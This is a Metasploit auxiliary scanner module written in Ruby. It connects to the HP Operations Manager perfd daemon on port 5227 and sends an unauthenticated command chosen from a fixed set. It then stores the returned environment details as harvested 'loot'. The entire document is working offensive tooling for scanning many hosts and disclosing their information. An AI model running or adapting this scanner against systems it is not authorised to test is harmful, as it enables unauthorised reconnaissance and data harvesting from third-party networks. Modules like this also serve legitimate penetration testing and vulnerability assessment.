##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'HP Operations Manager Perfd Environment Scanner',
      'Description' => %q{
        This module will enumerate the environment
        HP Operation Manager via daemon perfd.
        },
      'Author'      => [ 'Roberto Soares Espreto <robertoespreto[at]gmail.com>' ],
      'License'     => MSF_LICENSE
    )

    register_options(
    [
      Opt::RPORT(5227),
      OptEnum.new("CMD", [true, 'Command to execute', 'p', %w(u i p a g l T A q)])
    ], self.class)
  end

  def run_host(target_host)
    begin
      cmd = datastore['CMD']

      connect
      banner_resp = sock.get_once
      if banner_resp && banner_resp =~ /^Welcome to the perfd server/
        banner_resp.strip!
        print_good("#{target_host}:#{rport}, Perfd server banner: #{banner_resp}")
        perfd_service = report_service(host: rhost, port: rport, name: "perfd", proto: "tcp", info: banner_resp)
        sock.puts("\n#{cmd}\n")
        Rex.sleep(1)
        cmd_resp = sock.get_once

        loot_name = "HP Ops Agent perfd #{cmd}"
        path = store_loot(
          "hp.ops.agent.perfd.#{cmd}",
          'text/plain',
          target_host,
          cmd_resp,
          nil,
          "HP Ops Agent perfd #{cmd}",
          perfd_service
        )
        print_status("#{target_host}:#{rport} - #{loot_name} saved in: #{path}")
      else
        print_error("#{target_host}:#{rport}, Perfd server banner detection failed!")
      end
      disconnect
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue Timeout::Error => e
      print_error(e.message)
    end
  end
end
